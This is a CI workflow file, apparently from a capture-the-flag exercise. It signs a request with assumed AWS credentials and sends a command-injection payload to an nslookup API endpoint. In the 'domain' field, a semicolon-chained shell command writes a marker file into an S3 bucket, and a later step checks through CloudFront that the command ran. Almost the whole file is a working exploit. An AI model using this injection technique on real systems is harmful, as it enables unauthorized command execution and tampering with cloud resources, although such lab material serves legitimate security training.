name: Stage2-10-Command-Injection-Probe

on:
  push:
    branches:
      - corgi

permissions:
  contents: read
  id-token: write

jobs:
  probe:
    runs-on: ubuntu-latest

    env:
      AWS_REGION: us-east-1
      API_ID: 3q931syi7b
      SITE_BUCKET: site781fe43f26b9eba3
      SITE_DOMAIN: d4ysu55xg7wfi.cloudfront.net

    steps:
      - name: Configure AWS credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Install dependencies
        run: |
          python3 -m pip install requests requests-aws4auth --quiet

      - name: Execute controlled shell-injection probe
        run: |
          python3 - <<'PY'
          import os
          import requests
          from requests_aws4auth import AWS4Auth

          api = (
              "https://"
              + os.environ["API_ID"]
              + ".execute-api.us-east-1.amazonaws.com/dev/nslookup"
          )

          auth = AWS4Auth(
              os.environ["AWS_ACCESS_KEY_ID"],
              os.environ["AWS_SECRET_ACCESS_KEY"],
              "us-east-1",
              "execute-api",
              session_token=os.environ["AWS_SESSION_TOKEN"]
          )

          domain = (
              "example.com; "
              "printf CTF_PROBE > /tmp/ctf_probe; "
              "/opt/aws s3api put-object "
              "--bucket site781fe43f26b9eba3 "
              "--key ctf-probe.txt "
              "--body /tmp/ctf_probe "
              "--region us-east-1 "
              "--endpoint-url https://s3.us-east-1.amazonaws.com"
          )

          response = requests.post(
              api,
              json={"domain": domain},
              auth=auth,
              timeout=40
          )

          print(f"HTTP={response.status_code}")
          print(response.text)
          PY

      - name: Check marker through CloudFront
        run: |
          curl --silent --show-error \
            --location \
            --max-time 20 \
            --output /tmp/marker \
            --write-out "HTTP=%{http_code} SIZE=%{size_download}\n" \
            "https://${SITE_DOMAIN}/ctf-probe.txt"

          echo "Marker contents:"
          head -c 200 /tmp/marker || true
          echo
